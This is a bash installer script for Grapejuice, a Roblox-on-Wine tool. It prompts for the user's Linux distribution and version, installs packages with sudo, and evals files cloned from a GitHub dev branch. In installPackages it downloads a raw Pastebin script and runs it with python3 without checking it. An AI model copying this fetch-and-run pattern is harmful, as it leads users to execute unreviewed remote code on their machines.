#!/bin/bash
 
# Prompts
distroPromptText="
Welcome to the Grapejuice automatic installer! This script will attempt to install Grapejuice and all dependencies without you having to type any of the commands. If the script ever asks for your password, this is because authentication is needed to install most files (although there is a timer built into Linux that will allow more installs if within a certain time of the last authentication), so you will need to enter your password for the script to work in those cases.

Which Distribution of Linux are you using? (If it's not listed here, it's not supported) 
Debian - 1 
Ubuntu - 2 
Zorin - 3 
Linux Mint - 4
Help, I don't know my Distribution - help"

debianVersionPromptText="
Which version of Debian?
Debian 10 (buster) - 1
Debian 11 (bullseye) - 2"

ubuntuVersionPromptText="
Which version of Ubuntu?
Ubuntu 21.04 (Hirsute Hippo) - 1
Ubuntu 20.04 (Focal Fossa) - 2
Ubuntu 19.10 (Eoan Ermine) - 3
Ubuntu 18.04 (Bionic Beaver) - 4"

zorinVersionPromptText="
Which version of Zorin?
Zorin OS 15.2 - 1
Zorin OS 16 - 2"

mintVersionPromptText="
Which version of Linux Mint?
Linux Mint 20 \"Ulyana\" - 1
Linux Mint 19.3 \"Tricia\" - 2
LMDE4 (Debbie) - 3"


wineUpgradePromptText="
For safety of not messing with wine if an upgrade is not needed, please check the Grapejuice GitLab page to see the minimum version of wine needed to run Grapejuice. If you don't need Roblox Player, you will probably be fine without upgrading Wine, although you may want to just to be safe. If there is blank space shown below, that means that you do not have Wine installed or it is not recognized. You will have to install Wine in this case. Otherwise, your current version of Wine will show below. Do you want to upgrade wine? (y/n)"


# Errors
standardInvalidInputError="Could not understand your input, please try again"

# Info 
distroInfoText="
Your current Linux Distribution information from your system says:

$(lsb_release -a)

If this information does not clear up what to choose for this program, look at your system information in Settings, or look for a command that you can type into the Terminal that can give you more information.
"
# Distro Sorting
grapejuiceSimilarities=(
	"Debian10-Debian10"
	"Debian11-Debian10"
	"Ubuntu21.04-Debian10"
	"Ubuntu20.04-Debian10"
	"Ubuntu19.10-Debian10"
	"LMDE4-Debian10"
	"LinuxMint20-Debian10"
	"Zorin16-Debian10"
	"Ubuntu18.04-Ubuntu18.04"
	"Zorin15.2-Ubuntu18.04"
	"LinuxMint19.3-Ubuntu18.04"
)

wineSimilarities=(
	"Debian10-Debian10"
	"Debian11-Debian11"
	"Ubuntu21.04-Ubuntu21.04"
	"Ubuntu20.04-Ubuntu20.04"
	"Ubuntu19.10-Ubuntu19.10"
	"LMDE4-Debian10"
	"LinuxMint20-LinuxMint20"
	"Zorin16-Ubuntu20.04"
	"Ubuntu18.04-Ubuntu18.04"
	"Zorin15.2-Ubuntu18.04"
	"LinuxMint19.3-LinuxMint19"
)

# Executions
downloadDevBranch="git clone -b dev https://github.com/CheeseGodRoblox/GrapejuiceInstaller"

# Uneditable Variables
userDistro=""

installScriptDependencies(){
echo Installing script dependencies...
sudo apt install git
sudo apt install p7zip-full
sudo apt install curl
}
installPackages(){
installScriptDependencies
eval "$downloadDevBranch"
sudo apt install wine
local wineVersion=`wine --version`
echo $wineUpgradePromptText
echo $wineVersion
read upgradeResponse
if [[ $upgradeResponse == "y" ]]
then
	eval "`cat ./GrapejuiceInstaller/WineInstallations/"$3"`"
elif [[ $upgradeResponse == "n" ]]
then
	echo Continuing with current Wine version. If installation breaks, try to upgrade Wine.
else
	echo $standardInvalidInputError
fi

#sudo su root &
touch CursorFix.py
curl https://pastebin.com/raw/5SeVb005 >> CursorFix.py
python3 CursorFix.py
rm winehq.key
rm CursorFix.py


eval "`cat ./GrapejuiceInstaller/GrapejuiceInstallations/"$2"`"
cd $originalDirectory
}




distroPrompt(){
echo "$distroPromptText"
read distroResponse

if [[ $distroResponse -eq 1 ]]
then
	echo "$debianVersionPromptText"
	read versionResponse
	
	if [[ $versionResponse -eq 1 ]]
	then
		userDistro="Debian10"
	elif [[ $versionResponse -eq 2 ]]
	then
		userDistro="Debian11"
	else
		echo $standardInvalidInputError
		distroPrompt
	fi
	
elif [[ $distroResponse -eq 2 ]]
then
	echo "$ubuntuVersionPromptText"
	read versionResponse
	
	if [[ $versionResponse -eq 1 ]]
	then
		userDistro="Ubuntu21.04"
	elif [[ $versionResponse -eq 2 ]]
	then
		userDistro="Ubuntu20.04"
	elif [[ $versionResponse -eq 3 ]]
	then
		userDistro="Ubuntu19.10"
	elif [[ $versionResponse -eq 4 ]]
	then
		userDistro="Ubuntu18.04"
	else
		echo $standardInvalidInputError
		distroPrompt
	fi
	
elif [[ $distroResponse -eq 3 ]]
then
	echo "$zorinVersionPromptText"
	read versionResponse
	
	if [[ $versionResponse -eq 1 ]]
	then
		userDistro="Zorin15.2"
	elif [[ $versionResponse -eq 2 ]]
	then
		userDistro="Zorin16"
	else
		echo $standardInvalidInputError
		distroPrompt
	fi
	
elif [[ $distroResponse -eq 4 ]]
then
	echo "$mintVersionPromptText"
	read versionResponse
	
	if [[ $versionResponse -eq 1 ]]
	then
		userDistro="LinuxMint20"
	elif [[ $versionResponse -eq 2 ]]
	then
		userDistro="LinuxMint19.3"
	elif [[ $versionResponse -eq 3 ]]
	then 
		userDistro="LMDE4"
	else
		echo $standardInvalidInputError
		distroPrompt
	fi
elif [[ $distroResponse == help ]]
then
	echo "$distroInfoText"
else
	echo $standardInvalidInputError
	distroPrompt
fi

declare grapejuiceSimilar
declare wineSimilar

for distroMatch in "${grapejuiceSimilarities[@]}"
do
	IFS="-"
	read actualDistro similarDistro <<< $distroMatch
	if [[ $actualDistro == $userDistro ]]
	then
		grapejuiceSimilar=$similarDistro
	fi
done

for distroMatch in "${wineSimilarities[@]}"
do
	IFS="-"
	read actualDistro similarDistro <<< $distroMatch
	if [[ $actualDistro == $userDistro ]]
	then
		wineSimilar=$similarDistro
	fi
done

installPackages $userDistro $grapejuiceSimilar $wineSimilar
}

distroPrompt

/bin/bash
